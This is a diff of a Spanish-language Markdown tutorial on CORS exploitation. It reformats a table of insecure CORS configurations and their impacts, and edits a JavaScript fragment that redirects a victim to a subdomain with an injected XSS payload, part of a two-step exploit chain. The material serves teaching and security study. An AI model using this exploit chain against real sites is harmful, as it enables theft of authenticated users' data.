@@ -51,12 +51,12 @@ Ejemplo inseguro en cabeceras de respuesta:
 
 ## 💥 Métodos de Explotación
 
-|Escenario|Configuración insegura|Impacto|
-|---|---|---|
-|**Wildcard con credenciales**|`Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true`|Cualquier dominio puede robar datos del usuario autenticado|
-|**Reflejo de origen**|Servidor devuelve el mismo `Origin` enviado por el atacante|Bypass de restricción de orígenes|
-|**Subdominios inseguros**|`Access-Control-Allow-Origin: *.victima.com`|Un atacante con control de subdominio puede explotar CORS|
-|**Cabeceras expuestas**|`Access-Control-Expose-Headers` incluye cabeceras sensibles|Robo de tokens o datos confidenciales|
+| Escenario                     | Configuración insegura                                                      | Impacto                                                     |
+| ----------------------------- | --------------------------------------------------------------------------- | ----------------------------------------------------------- |
+| **Wildcard con credenciales** | `Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true` | Cualquier dominio puede robar datos del usuario autenticado |
+| **Reflejo de origen**         | Servidor devuelve el mismo `Origin` enviado por el atacante                 | Bypass de restricción de orígenes                           |
+| **Subdominios inseguros**     | `Access-Control-Allow-Origin: *.victima.com`                                | Un atacante con control de subdominio puede explotar CORS   |
+| **Cabeceras expuestas**       | `Access-Control-Expose-Headers` incluye cabeceras sensibles                 | Robo de tokens o datos confidenciales                       |
 
 ---
 
@@ -185,7 +185,7 @@ En este caso, el exploit tiene dos pasos:
     '<\/script>';
 
     // 2. Redirigimos a la víctima al subdominio con XSS inyectando el payload
-    var urlFinal = "http://subdominio.vulnerable.net/?productId=" + encodeURIComponent(payload);
+    var urlFinal = "http://subdominio.vulnerable.net/?productId=" + encodeURIComponent(payload) + "&storeId=1";
     document.location = urlFinal;
 </script>
 ```
